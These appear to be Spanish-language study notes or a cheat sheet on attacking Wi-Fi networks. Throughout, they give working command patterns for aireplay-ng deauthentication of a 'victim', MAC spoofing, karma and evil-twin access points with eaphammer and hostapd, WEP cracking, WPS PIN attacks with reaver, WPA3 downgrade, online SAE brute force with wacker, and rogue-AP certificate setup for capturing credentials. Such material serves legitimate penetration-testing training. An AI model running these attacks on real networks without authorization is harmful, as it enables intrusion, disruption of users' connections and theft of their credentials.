```
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

```
sudo aireplay-ng --test wlan0
```

wpa-supplicant:
- redes MGT
En este caso hay varios parámetros configurables, depende del cómo tengamos establecidos los protocolos en el AP y en el Radius. El patrón sería:
```
network={
  ssid="SSID_NAME"
  key_mgmt=WPA-EAP
  eap=PEAP
  anonymous_identity="anonymous"
  identity="USERNAME"
  password="PASSWORD"
  phase2="auth=MSCHAPV2"
}
```
- redes SAE
Este caso sería el de redes WPA3, el patrón es:
```
network={
  ssid="SSID_NAME"
  psk="PASSWORD"
  key_mgmt=SAE
  ieee80211w=2
}
```
```
airodump-ng wlan0mon --band bag
```
```processing
sudo airodump-ng wlan0mon -w /home/user/wifi/scan
```
```processing
# Ejecutar wifi_db
python3 wifi_db.py -d database.sqlite /home/user/wifi/
```
```processing
sqlitebrowser database.sqlite
```
- Cambiamos la MAC mediante una de estas dos opciones:
```processing
sudo ip link set dev <INTERFACE> address <new_mac_address>
```
```processing
ip link set wlan2 down
macchanger -m <CLIENTE_MAC> <INTERFAZ>
ip link set wlan2 up
```
Si nuestra víctima está conectada a un AP, podemos echarle mediante:
```processing
aireplay-ng -0 0 -a <mac del AP> -c <mac del cliente> wlan0mon
```
Podemos crear el falso AP con el mismo ESSID que aparece en uno de los probes mediante hostapd, aunque hay otras herramientas que nos lo automatizan, como eaphammer. Para el ataque karma el patrón sería:
```processing
cd ~/tools/eaphammer/
./eaphammer -i wlan0 --essid karma --cloaking full -c 1 --auth open --karma
```
Redes OWE pueden ser atacadas:
- Evil Twin:  Un atacante puede crear un punto de acceso falso que parezca un punto de acceso legítimo. Los usuarios, engañados por la apariencia similar, se conectan al punto de acceso malicioso. Utilizando herramientas como hostapd y airbase-ng, un atacante puede emular el SSID y las características de la red OWE original. Los usuarios que se conecten al punto de acceso malicioso pueden tener su tráfico capturado y analizado.
- Portal cautivo falso: Un atacante puede configurar un portal cautivo falso que parece legítimo, similar al utilizado en la red Wi-Fi real. Podemos emplear la herramienta Setoolkit por ejemplo.
- Ataques MitM: con técnicas como el ARP-spoofing.

Crear AP para WPA2:
```processing
interface=wlan0
driver=nl80211
hw_mode=g
channel=6
ssid=wifi-mobile
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=passwordPSK
```

Ataques WEP:
1. Captura y descifrado: simplemente escuchando, si tiene suficiente tráfico, podemos obtener la clave empleando airodump-ng y aircrack-ng. Esto es un proceso pasivo.
2. Aceleración de la recolección de paquetes: Podemos acelerar el proceso generando tráfico en la red de manera artificial:
- Falsa autenticación: Enviar solicitudes de autenticación falsa utilizando herramientas como aireplay-ng. Esto engaña al AP haciéndole creer que su dispositivo es un cliente auténtico.
```processing
aireplay-ng -1 0 -a <BSSID> -h <mac cliente> <INTERFAZ>
```
- Repetición de solicitudes de ARP: Capturar paquetes ARP válidos, luego reinyéctelos repetidamente en la red.
```processing
aireplay-ng -3 -b <BSSID> -h <mac cliente> <INTERFAZ>
```
- Ataque de desautenticación: Los ataques de desautenticación fuerzan la desconexión temporal de los clientes legítimos de la red, lo que les obliga a reconectarse y autenticarse nuevamente. Esto genera nuevo tráfico, incluyendo solicitudes ARP. 
```processing
aireplay-ng -0 1 -a <BSSID> -c <mac cliente> <INTERFAZ>
```
Los patrones de los comandos de captura y descifrado de clave serían:
```processing
sudo airodump-ng -c <canal> --bssid <mac del AP> -w <archivo.cap> <interfaz>

sudo aircrack-ng <archivo.cap>
```

¿Qué pasa cuando nuestro AP no está?
El ataque NoAP, también conocido como half-handshake o medio-handshake, es una técnica utilizada por los atacantes para engañar a los clientes haciéndoles creer que están conectándose a un punto de acceso legítimo cuando en realidad están conectados a un dispositivo malicioso. Este tipo de ataque se basa en la suplantación de identidad del AP. Este ataque se basa en crear una red basándose en los probes de los clientes.
El PNL (Preferred Network List) es una lista de redes conocidas y preferidas que el dispositivo almacena y utiliza para decidir automáticamente a cuál red conectarse, basándose en factores como la prioridad de la red y la disponibilidad de la señal, esto ocurre cuando un cliente tiene habilitada la opción de conectarse automáticamente en los dispositivos. Los dispositivos almacenan tanto el ESSID como el tipo de seguridad y su clave, pero no almacenan ni el BSSID ni ningún otro tipo de información que identifique al AP.

Ataque WPS:
Primero identificamos las redes que tengan activado wps mediante:
```processing
sudo airodump-ng wlan0mon --wps
```
A continuación emplearemos la herramienta _reaver_:
```processing
sudo reaver -i wlan0mon -b <BSSID> -vv
```

**SAE (Simultaneous Authentication of Equals)**
La Autenticación Simultánea de Iguales (SAE) en inglés, Simultaneous Authentication of Equals, es un protocolo de autenticación y de intercambio de claves basado en contraseñas, utilizado en WPA3 (Wi-Fi Protected Access 3). Mejora la seguridad respecto a los protocolos anteriores al proporcionar resistencia a los ataques de fuerza bruta offline. SAE aprovecha la criptografía de curva elíptica para establecer una conexión segura incluso si la contraseña es débil.

- Ataques de Degradación a WPA2
Este tipo de ataque consiste en engañar al dispositivo para que se conecte utilizando el protocolo WPA2 en lugar de WPA3, siendo vulnerable a ataques de WPA2. A continuación, se puede ver el proceso para realizar el downgrade.
Realizaremos un ataque de deautenticación del cliente conectado a WPA3:
```processing
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0
```
Previamente habremos montado un AP WPA2 con el mismo essid, empleando hostapd
Ahora debemos capturar el handshake y proceder con él como en el caso PSK:
```processing
sudo airodump-ng -c 6 --bssid <FakeAP_MAC> -w capture wlan0
```

Ataque de Fuerza Bruta Online
Aunque SAE está diseñado para ser resistente a ataques de fuerza bruta gracias a la utilización de Dragonfly handshake, los atacantes pueden intentar ataques de fuerza bruta online. Necesitan realizar múltiples intentos contra la red, pero esto puede ser detectado y mitigado si se cuenta con una buena política de contraseñas, principalmente evitando contraseñas predecibles o inseguras.
Una de las herramientas que podemos emplear es _wacker_.
```processing
./wacker.py --wordlist $DICCIONARIO --ssid $ESSID --bssid $BSSID --interface $INTERFACE --freq $FRECUENCIA_CANAL
```
Herramienta desarrollada en python que permite emplear un diccionario de contraseñas, pero ¡ojo, es un ataque muy activo!

Rogue-AP
El ataque de Rogue Access Point (AP) implica la creación de un punto de acceso no autorizado. Es importante tener en cuenta que este ataque solo funciona si se dan los siguientes 2 puntos.
- El cliente utiliza usuario y contraseña para la autenticación (no utiliza certificado).
- El cliente no verifica el certificado del servidor con una CA conocida.
Para realizar un ataque eficaz de Rogue AP, es necesario generar un certificado SSL falso. Este certificado es el que se va a mandar al cliente de la red para montar el túnel TLS, muy similar al certificado de las páginas web utilizadas en HTTPS. Para estos ataques vamos a utilizar principalmente eaphammer, por lo que tenemos que generar un certificado con el siguiente comando (esto solo hay que hacerlo la primera vez):
```processing
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard
```
Relay Attack
Un ataque de reenvío (en inglés, relay attack), permite al atacante reenviar las credenciales que nos envía el cliente hacia un AP legítimo, permitiéndonos acceder a la red sin necesidad de crackear el hash MSCHAPv2. Este ataque solo funciona en este método ya que MSCHAPv2 funciona con un Challenge y un Response sin ningún dato que identifique la conexión.
